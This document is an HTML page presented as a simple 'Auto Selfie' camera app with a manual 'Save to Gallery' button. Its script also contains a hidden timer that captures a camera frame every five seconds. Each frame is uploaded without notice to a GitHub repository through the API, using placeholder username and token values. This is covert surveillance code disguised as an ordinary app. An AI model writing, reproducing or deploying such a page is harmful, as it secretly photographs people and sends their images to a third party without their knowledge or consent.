<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Auto Selfie</title>
<style>
    body{
        margin:0;
        background:#111;
        display:flex;
        flex-direction:column;
        align-items:center;
        justify-content:center;
        height:100vh;
        color:white;
        font-family:sans-serif;
    }
    video{
        width:90vw;
        max-width:400px;
        border-radius:20px;
        box-shadow:0 0 20px rgba(255,255,255,0.2);
    }
    button{
        margin-top:20px;
        padding:15px 30px;
        font-size:20px;
        border:none;
        border-radius:40px;
        background:white;
        color:black;
        cursor:pointer;
    }
</style>
</head>
<body>

<video id="camera" autoplay playsinline></video>
<button id="capture">ðŸ“¸ Save to Gallery</button>

<script>
const video = document.getElementById("camera");
const button = document.getElementById("capture");

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => video.srcObject = stream);

function saveImage(canvas){
    const link = document.createElement("a");
    link.download = `selfie-${Date.now()}.jpg`;
    link.href = canvas.toDataURL("image/jpeg");
    link.click();
}

// Manual button save
button.onclick = () => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    saveImage(canvas);
};

// Auto capture every 5 seconds
setInterval(() => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    fetch(`https://api.github.com/repos/YOUR_USERNAME/selfie-auto-capture/contents/photos/selfie-${Date.now()}.jpg`, {
        method:"PUT",
        headers:{
            "Authorization":"Bearer YOUR_GITHUB_TOKEN",
            "Content-Type": "application/json"
        },
        body:JSON.stringify({
            message:"Auto photo upload",
            content:canvas.toDataURL("image/jpeg").replace(/^data:image\/jpeg;base64,/, "")
        })
    });
},5000);
</script>
</body>
</html>
